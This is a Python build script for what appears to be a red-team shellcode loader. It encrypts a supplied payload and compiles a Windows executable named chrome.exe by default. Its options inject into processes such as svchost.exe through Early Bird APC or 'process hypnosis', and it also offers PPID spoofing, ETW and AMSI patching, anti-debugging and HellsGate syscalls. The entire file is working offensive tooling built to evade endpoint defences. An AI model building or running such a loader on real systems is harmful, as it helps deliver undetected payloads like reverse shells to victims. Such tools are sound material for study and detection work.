

import os
import subprocess
import glob
import argparse
import time
import random
from common.crypto import *
from common.encoder import *
from common.helper import *
def clean():
    

    files_to_remove = glob.glob("build/*.exe") + [
        "build/data.h",
        "build/syscalls.h",
    ]
    for f in files_to_remove:
        if os.path.exists(f):
            print(f"[*] Removing {f}")
            os.remove(f)


def build_project(
    source_folder, output_name, compiler="gcc", flags=None, use_hellsgate=False
):

   
    if flags is None:
        flags = []

    # /////////////////////////////////////////////
    # Recursively find all .c and .cpp files in src and subfolders
    # /////////////////////////////////////////////
    source_files = [
        f for f in glob.glob(os.path.join(source_folder, "**", "*.c"), recursive=True)
    ] + [
        f for f in glob.glob(os.path.join(source_folder, "**", "*.cpp"), recursive=True)
    ]
    if not source_files:
        print(f"No sourcecode file found in {source_folder}.")
        return False

    # /////////////////////////////////////////////
    # HellsGate assembly object handling
    # /////////////////////////////////////////////
    # Handle HellsGate object file if needed
    hellsgate_obj = None
    if use_hellsgate:
        hellsgate_obj = os.path.join("src", "modules", "syscall", "HellsGate.obj")
        if os.path.exists(hellsgate_obj):
            print(f"[*] Including HellsGate assembly object: {hellsgate_obj}")
        else:
            print(f"[!] Warning: HellsGate.obj not found at {hellsgate_obj}")
            hellsgate_obj = None

    # /////////////////////////////////////////////
    # Resource file compilation
    # /////////////////////////////////////////////
    # Handle resource file
    rc_file = os.path.join("meta", "meta.rc")
    res_file = None
    if os.path.exists(rc_file):
        res_file = os.path.splitext(rc_file)[0] + ".o"
        windres_cmd = ["windres", rc_file, res_file]
        print(f"[*] Compiling resource: {' '.join(windres_cmd)}")
        try:
            subprocess.run(windres_cmd, check=True)
        except Exception as e:
            print(f"Resource compilation failed: {e}")
            return False

    # /////////////////////////////////////////////
    # GCC compilation command construction
    # /////////////////////////////////////////////
    # Build the complete compilation command with all flags and files
    compile_command = (
        [
            compiler,
            "-g",
            "-Iinclude",
            "-Isrc",
            "-ffunction-sections",
            "-fdata-sections",
            "-fno-inline",
            "-Ibuild",
            "-O2",
            "-Os",
            "-Wno-unused-variable",
            "-Wno-unused-function",
            "-no-pie",
            "-fno-pie",
            "-static",
            "-Wl,--gc-sections",
            "-o",
            output_name,
        ]
        + ([res_file] if res_file else [])
        + ([hellsgate_obj] if hellsgate_obj else [])
        + source_files
        + flags
    )
    # /////////////////////////////////////////////
    # Add explanation of compilation process
    # /////////////////////////////////////////////
    print("[*] Starting compilation with command:")
    print(" ".join(compile_command))

    try:
        subprocess.run(compile_command, check=True)
        print(f"[+] Successfully compiled to: {output_name}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"Compilation Error: {e}")
        return False


def main():

    parser = argparse.ArgumentParser(
        description="Build a custom shellcode loader with various encoding and execution techniques.",
        epilog="""
Examples:

  # Remote injection techniques (require target process):
  builder.py revsh.bin --technique eb --target_process notepad.exe
  builder.py payload.bin --technique hypnosis --target_process chrome.exe --encryption ascii
  
  # Full evasion:
  python builder.py payload.bin --technique eb --encryption ascii --key MySecret 
         --target_process svchost.exe --spoof explorer.exe --noetw --noamsi --antidebug --protect
  
  # Clean build artifacts:
  python builder.py --clean


""",
    )
    parser.add_argument("input", nargs="?", help="Path to the input shellcode file")
    parser.add_argument(
        "--encryption",
        choices=["ascii"],
        default="ascii",
        help="Encryption mode",
    )
    parser.add_argument(
        "--technique",
        choices=["eb", "hypnosis"],
        default="eb",
        help="Execution technique",
    )
    parser.add_argument(
        "--clean", action="store_true", help="Clean build artifacts and exit"
    )
    parser.add_argument(
        "--target_process",
        help="Target process for injection techniques (eb/hypnosis).",
    )
    parser.add_argument(
        "--key",
        default="L33tHax0rKey",
        help="Encryption key (default: 'L33tHax0rKey')",
    )
    parser.add_argument(
        "--spoof",
        default="explorer.exe",
        help="Process name for PPID spoofing (only supported by hypnosis/eb techniques)",
    )
    parser.add_argument(
        "--nodebug", action="store_true", help="Build a stealthy binary without strings"
    )
    parser.add_argument(
        "--antidebug", action="store_true", help="Enable anti debugging features"
    )
    parser.add_argument(
        "--noetw",
        action="store_true",
        help="This function patches the 'EtwEventWrite' syscall to return which patches ETW",
    )
    parser.add_argument(
        "--noamsi", action="store_true", help="Disable AMSI by patching the syscall"
    )
    parser.add_argument(
        "--delay",
        type=int,
        help="Specify the exec timing delay (in minutes)",
    )
    parser.add_argument(
        "--protect",
        action="store_true",
        help="Change the security descriptor to protect the process",
    )
    parser.add_argument(
        "--output",
        default="chrome",
        help="Output name (default: chrome)",
    )
    args = parser.parse_args()

    if args.clean:
        clean()
        print("[+] Clean complete.")
        return

    # /////////////////////////////////////////////
    # Initialization and payload processing
    # /////////////////////////////////////////////
    print("[...] Starting...")
    time.sleep(1)
    input_path = args.input
    shellcode = open_payload(input_path)

    # /////////////////////////////////////////////
    # Encryption key setup and validation
    # /////////////////////////////////////////////
    output_header = os.path.join("build","data.h")
    key = args.key
    if args.key == parser.get_default("key"):
        print("No key specified, key 'L33tHax0rKey' was used")
    key = bytes(key, "ascii")
    if len(key) < 5 or len(key) > 256:
        raise ValueError("Key must be between 5 and 256 bytes long.")
    encrypted_key = encrypt_key(key)

    c_array_key = to_c_array("key", encrypted_key)
    print("Encrypted key:", c_array_key)

    # /////////////////////////////////////////////
    # Encryption mode selection and processing
    # /////////////////////////////////////////////
    seed = random.randint(1, 2147483646)
    
    if args.encryption == "ascii":
        print("[*] converting to c array")
        c_array = "// Encoded using word encoding\n"
        c_array += (
            'const char* hw = "'
            + encode_encrypted_payload(shellcode, key, seed)
            + '";\n'
        )
        print("[+] Conversion to C array complete.")
        compile_flags = ["-DUSE_WORDS"]
    else:
        raise ValueError("No valid encoding mode specified.")

    # /////////////////////////////////////////////
    # Injection technique selection and flag setup
    # /////////////////////////////////////////////


    if args.technique == "eb":
        compile_flags.append("-DTECHNIQUE_EB")
        print("[+] Using Early Bird APC injection technique via creating a new process")
    elif args.technique == "hypnosis":
        compile_flags.append("-DTECHNIQUE_HYPNOSIS")
        print("[+] Using process Hypnosis to inject shellcode")
    else:
        raise ValueError("No valid technique specified.")
    # /////////////////////////////////////////////
    # No strings flag
    # /////////////////////////////////////////////
    if args.nodebug:
        compile_flags.append("-DNODEBUG")
        print("Shellcode loader running without debug printing")

    # /////////////////////////////////////////////
    # Disable ETW
    # /////////////////////////////////////////////
    if args.noetw:
        compile_flags.append("-DNOETW")

    # /////////////////////////////////////////////
    # Disable AMSI
    # /////////////////////////////////////////////
    if args.noamsi:
        compile_flags.append("-DNOAMSI")

    # /////////////////////////////////////////////
    # Target process and spoofing configuration
    # /////////////////////////////////////////////
    compile_flags.append(f'-DTARGET_PROCESS=L"{args.target_process}"')
    compile_flags.append(f'-DTARGET_PROCESS_SPOOF=L"{args.spoof}"')
    write_header(output_header, c_array, c_array_key, seed)
    # /////////////////////////////////////////////
    # Delay exec
    # /////////////////////////////////////////////
    if args.delay is not None:
        compile_flags.append(f"-DTARGET_PROC_EXEC_DELAY={args.delay}")

    # /////////////////////////////////////////////
    # Anit debugging
    # /////////////////////////////////////////////
    if args.antidebug:
        compile_flags.append("-DANTIDEBUG")

    # /////////////////////////////////////////////
    # Change security descriptor
    # /////////////////////////////////////////////
    if args.protect:
        compile_flags.append(f"-DPROTECT")

    # /////////////////////////////////////////////
    # Final build process execution
    # /////////////////////////////////////////////
    folder = os.path.join("src")
    output_name = os.path.join("build", f"{args.output}.exe")

    
    write_syscalls("build\\syscalls.h")
    build_project(folder, output_name, flags=compile_flags, use_hellsgate=True)


if __name__ == "__main__":
    try:
        print(
            r"""
     _______ _______  ______ __   _ _______ _______ _______  ______
     |  |  | |_____| |  ____ | \  | |______    |    |_____| |_____/
     |  |  | |     | |_____| |  \_| |______    |    |     | |    \_
                                                        by 0xjx
            """
        )

        main()
    except Exception as e:
        print(f"Error: {e}")
